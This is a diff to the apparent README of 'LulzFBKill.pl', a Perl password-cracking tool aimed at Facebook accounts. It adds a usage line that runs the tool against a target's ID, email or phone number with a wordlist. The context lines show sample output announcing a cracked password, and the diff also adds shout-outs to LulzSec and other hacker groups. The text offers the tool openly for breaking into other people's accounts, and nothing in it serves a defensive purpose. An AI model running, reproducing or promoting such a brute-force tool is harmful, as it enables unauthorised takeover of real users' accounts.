@@ -20,6 +20,10 @@ through HTTPS.
  # perl -MCPAN -e 'install Net::SSLeay'
 
 
+
+
+#perl LulzFBKill.pl {fb-id}or{email@facebook.com} wordlist Or #perl LulzFBKill.pl +39783987890 wordlist
+
  [+] Lulz Start Cracking THF-Targe using ID or EMail or Phone numnber ...
 
  [-] test -> Failed >> Check Your password List and Try agine
@@ -34,3 +38,5 @@ through HTTPS.
 
  [+] Luulz!! Pass Cracked => Pass is Lu!z53C
 
+#Respect To Yall #AnonsFreinds #LulzSec #RedCult #IntelSec #WolfSec #Sec3viles #AnonGhots
+#Greetz to #Mark #Danksithanon #Tamara #Tan #Richard #Goies #Mr.G #Bram #Neo #UshankaKid
